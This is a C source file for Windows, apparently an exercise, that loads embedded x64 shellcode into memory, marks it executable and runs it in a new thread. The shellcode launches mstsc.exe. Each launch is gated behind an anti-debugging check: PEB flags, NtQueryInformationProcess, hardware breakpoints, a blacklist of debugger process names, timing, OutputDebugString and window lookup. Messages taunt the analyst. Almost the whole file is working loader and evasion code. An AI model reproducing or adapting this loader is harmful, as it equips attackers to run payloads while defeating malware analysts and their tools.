#include <Windows.h>
#include <stdio.h>
#include <Tlhelp32.h>
#include "Structs.h"
#include "NTSTATUS.h"

unsigned char Payload[] =
{
    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
    "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
    "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
    "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
    "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
    "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
    "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
    "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
    "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
    "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
    "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
    "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
    "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
    "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
    "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
    "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
    "\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
    "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
    "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
    "\xd5\x6d\x73\x74\x73\x63\x2e\x65\x78\x65\x00"
};

// Function for allocating memory with appropriate permissions
LPVOID AllocateExecutableMemory(size_t size) {
    LPVOID pMemory = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_READWRITE);
    if (pMemory == NULL) {
        printf("[!] VirtualAlloc failed with error code: %d\n", GetLastError());
        exit(1);  // Exit with an error code
    }
    return pMemory;
}

// Function that modifies memory permissions to execute the payload
void RunShellcode(LPVOID pMemory, size_t size) {
    DWORD oldProtect;
    if (!VirtualProtect(pMemory, size, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("[!] VirtualProtect failed with error code: %d\n", GetLastError());
        exit(1);  // Exit with an error code
    }

    // Copy the payload into the allocated memory
    memcpy(pMemory, Payload, size);

    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pMemory, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("[!] CreateThread failed with error code: %d\n", GetLastError());
        exit(1);  // Exit with an error code
    }
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
}


// Function checks if a debugger is present and terminates the program if detected
BOOL DebugPresent() {
    if (IsDebuggerPresent()) {
        printf("Nice Try Analyst \n");
        exit(1);
    }
    return FALSE;

}

// Function checks if a debugger is present using PEB's 'BeingDebugged' flag
BOOL DebugPresentUpdated() {

# // getting the PEB structure
#ifdef _WIN64
    PPEB					pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32
    PPEB					pPeb = (PEB*)(__readfsdword(0x30));
#endif

    // checking the 'BeingDebugged' element
    if (pPeb->BeingDebugged == 1) {
        printf("Another Fail! \n");
        return TRUE;
    }
    return FALSE;
}

// Function checks debugger presence using NtQueryInformationProcess
BOOL DebugNtQueryInformationProcess() {
    // Forward Declarations
    NTSTATUS                      STATUS                        = NULL;
    fnNtQueryInformationProcess   pNtQueryInformationProcess    = NULL;
    DWORD64                       dwIsDebuggerPresent           = NULL;
    DWORD64                       hProcessDebugObject           = NULL;

    // Retrieve NtQueryInformationProcess Address 
    pNtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(GetModuleHandle(TEXT("NTDLL.DLL")), "NtQueryInformationProcess");
    if (pNtQueryInformationProcess == NULL) {
        printf("[!] pNtQueryInformationProcess failed with error code: %d \n", GetLastError());
        return FALSE;
    }

    /*
        __kernel_entry NTSTATUS NtQueryInformationProcess(
          [in]            HANDLE           ProcessHandle,
          [in]            PROCESSINFOCLASS ProcessInformationClass,
          [out]           PVOID            ProcessInformation,
          [in]            ULONG            ProcessInformationLength,
          [out, optional] PULONG           ReturnLength
        );
    */

    // Calling NtQueryInformationProcess to check if a debugger is attached to the current process.
    STATUS = pNtQueryInformationProcess(
        GetCurrentProcess(),               // Use the handle of the current process.
        ProcessDebugPort,                  // Specify the type of information to retrieve (debugger status).
        &dwIsDebuggerPresent,              // Store the result in this variable.
        sizeof(DWORD64),                   // The size of the output buffer.
        NULL                               // Not interested in the actual length of information retrieved.
    );

    if (STATUS != 0x0) {
        printf("[!] NtQueryInformationProcess failed with status: 0x%0.10X \n", STATUS);
        return FALSE;
    }

    // When the handle is not 0, it means that the debugger is detected
    if (dwIsDebuggerPresent != NULL) {
        printf("Debugger Detected \n");
        return TRUE;
    }

    // Retrieve the handle to the debug object associated with the current process
    STATUS = pNtQueryInformationProcess(
        GetCurrentProcess(),            // Process handle (current process)
        ProcessDebugObjectHandle,       // Information class indicating the type of information to retrieve (debug object handle)
        &hProcessDebugObject,           // Pointer to store the debug object handle
        sizeof(DWORD64),                // Size of the output buffer (size of a DWORD64, as it's the expected size for a handle)
        NULL                            // Not interested in the actual length of information retrieved, so set to NULL
    );


    // If STATUS is not 0 and not 0xC0000353 (that is 'STATUS_PORT_NOT_SET')
    if (STATUS != 0x0 && STATUS != 0xC0000353) {
        printf("\t[!] NtQueryInformationProcess [2] Failed With Status : 0x%0.8X \n", STATUS);
        return FALSE;
    }

    // If NtQueryInformationProcess returned a non-zero value, the handle is valid, which means we are being debugged
    if (hProcessDebugObject != NULL) {
        printf("You lose again, debugger detected \n");
        return TRUE;
    }

    return FALSE;
}

// Function to check for hardware breakpoints by examining the CONTEXT structure
BOOL HardwareBp() {
    // CONTEXT_DEBUG_REGISTERS flag to retrieve debug register information
    CONTEXT		Ctx = { .ContextFlags = CONTEXT_DEBUG_REGISTERS };

    // Changing Thread Context
    if (!GetThreadContext(GetCurrentThread(), &Ctx)) {
        printf("\t[!] GetThreadContext Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // When the dr[0-3] are null means debugger detected
    if (Ctx.Dr0 != NULL || Ctx.Dr1 != NULL || Ctx.Dr2 != NULL || Ctx.Dr3 != NULL)
        return TRUE; // Detected a debugger

    return FALSE;
}

// Wide Character Arrray Defined
#define BlacklistArray_Size 5
WCHAR* g_BlacklistedDebuggers[BlacklistArray_Size] = {
    L"x64dbg.exe",
    L"ida.exe",
    L"ida64.exe",
    L"vsDebugConsole.exe",
    L"msvsmon.exe"

};

BOOL BlacklistProcesses() {
    HANDLE hSnapshot = NULL;
    
    // Getting the size of the PROCESSENTRY32W structure
    PROCESSENTRY32W ProcEntry = { .dwSize = sizeof(PROCESSENTRY32W) };
    BOOL STATE = FALSE;

    // Create snaphot of the current processes
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("[!] CreateToolhelp32Snapshot Failed With Error Code: %d", GetLastError());
        CloseHandle(hSnapshot);
        return FALSE;
    }

    // Retrieve information of the first process found inside the snapshot
    if (!Process32FirstW(hSnapshot, &ProcEntry)) {
        printf("\t [!] Process32FirstW Failed With Error Code: %d", GetLastError());
        return FALSE;
    }

    // Loop through the blacklist to identify if a debugger is running
    do {
        for (int i = 0; i < BlacklistArray_Size; i++) {
            // Compare the executable name inside the process with our defined blacklist array
            if (wcscmp(ProcEntry.szExeFile, g_BlacklistedDebuggers[i]) == 0) {
                // Debugger detected; print information and set the STATE to TRUE
                wprintf(L"\t[i] Found \"%s\" At PID : %d\n", ProcEntry.szExeFile, ProcEntry.th32ProcessID);
                wprintf(L"You Lose again.. debugger detected\n");
                STATE = TRUE;
                break;  // Break out of the inner loop if a debugger is detected
            }
        }
        if (STATE) {
            break;  // Break out of the outer loop if a debugger is detected
        }
    } while (Process32Next(hSnapshot, &ProcEntry));

    // Close the process snapshot handle
    CloseHandle(hSnapshot);

    return STATE;  // Return the final state, indicating whether a debugger was detected
}

BOOL DetectDelay() {
    DWORD dwDelay1 = NULL;
    DWORD dwDelay2 = NULL;

    dwDelay1 = GetTickCount64();
    dwDelay2 = GetTickCount64();

    printf("[!] dwDelay2 - dwDelay1 : %d \n", (dwDelay2 - dwDelay1));

    // time in seconds
    if ((dwDelay2 - dwDelay1) > 50) {
        // Debugger Detected
        printf("Try Smarter, debugger detected \n");
        return TRUE;
    }
    return FALSE;
}

BOOL DetectDelay2() {
    LARGE_INTEGER Time1 = { 0 }, Time2 = { 0 };

    // Retrieve current value of performace counter and save it inside Time1 integer
    if (!QueryPerformanceCounter(&Time1)) {
        printf("[!] QueryPerformaceCounter Failed With Error Code: %d", GetLastError());
        return FALSE;
    }
    // Retrieve current value of performace counter and save it inside Time2 integer
    if (!QueryPerformanceCounter(&Time2)) {
        printf("[!] QueryPerformaceCounter Failed With Error Code: %d", GetLastError());
        return FALSE;
    }

    // Check if time2 is bigger than 100000 counts
    if ((Time2.QuadPart - Time1.QuadPart) > 100000) {
        // debugger detected
        printf("You lose, debugger detected\n");
        return TRUE;
    }
    // No significant delay, debugger not detected
    return FALSE;
}

BOOL DebugString() {
    SetLastError(1);
    OutputDebugStringW(L"You Think You Are Smart huh ... \n");

    if (GetLastError() == 0) {
        //debugger detected
        return TRUE;
    }
    return FALSE;
}

BOOL FindDebugWindow() {
    if (FindWindowW(NULL, L"x64dbg")) {
        // Debugger detected, terminate the process
        TerminateProcess(GetCurrentProcess(), 1);
        return TRUE;
    }
    return FALSE;
}



int main() {
    if (!DebugPresent()) {
        printf("[+] Running Payload 1 ... \n");

        // Calculate the size of the shellcode
        size_t shellcodeSize = sizeof(Payload);

        // Allocate executable memory
        LPVOID pMemory = AllocateExecutableMemory(shellcodeSize);

        // Run the shellcode
       RunShellcode(pMemory, shellcodeSize);
    }

    if (!DebugPresentUpdated()) {
        printf("[+] Running Payload 2 ... \n");

        // Calculate the size of the shellcode
        size_t shellcodeSize2 = sizeof(Payload);

        // Allocate executable memory
        LPVOID pMemory2 = AllocateExecutableMemory(shellcodeSize2);

        // Run the shellcode
        RunShellcode(pMemory2, shellcodeSize2);


    }

    if (!DebugNtQueryInformationProcess()) {
        printf("[+] Running Payload 3 ... \n");

        size_t shellcodeSize3 = sizeof(Payload);
        LPVOID pMemory3 = AllocateExecutableMemory(shellcodeSize3);
        RunShellcode(pMemory3, shellcodeSize3);
    }
    if (!HardwareBp()) {
        printf("[+] Running Payload 4 ... \n");

        size_t shellcodeSize4 = sizeof(Payload);
        LPVOID pMemory4 = AllocateExecutableMemory(shellcodeSize4);
        RunShellcode(pMemory4, shellcodeSize4);
    }

    if (!BlacklistProcesses()) {
        printf("[+] Running Payload 5 ... \n");

        size_t shellcodeSize5 = sizeof(Payload);
        LPVOID pMemory5 = AllocateExecutableMemory(shellcodeSize5);
        RunShellcode(pMemory5, shellcodeSize5);
    }
    

    if (!DetectDelay()) {
         printf("[+] Running Payload 6 ... \n");

         size_t shellcodeSize6 = sizeof(Payload);
         LPVOID pMemory6 = AllocateExecutableMemory(shellcodeSize6);
         RunShellcode(pMemory6, shellcodeSize6);
    }

    if (!DetectDelay2()) {
        printf("[+] Running Payload 7 ... \n");

        size_t shellcodeSize7 = sizeof(Payload);
        LPVOID pMemory7 = AllocateExecutableMemory(shellcodeSize7);
        RunShellcode(pMemory7, shellcodeSize7);
    }

    if (!DebugString()) {
        printf("[+] Running Payload 8 ... \n");

        size_t shellcodeSize8 = sizeof(Payload);
        LPVOID pMemory8 = AllocateExecutableMemory(shellcodeSize8);
        RunShellcode(pMemory8, shellcodeSize8);
        getchar();
    }
    if (!FindDebugWindow()) {
        printf("[+] Running Payload 9 ... \n");

        size_t shellcodeSize9 = sizeof(Payload);
        LPVOID pMemory9 = AllocateExecutableMemory(shellcodeSize9);
        RunShellcode(pMemory9, shellcodeSize9);
        getchar();
    }
    else {
        getchar();
        exit(0);
    }

    return 0;
}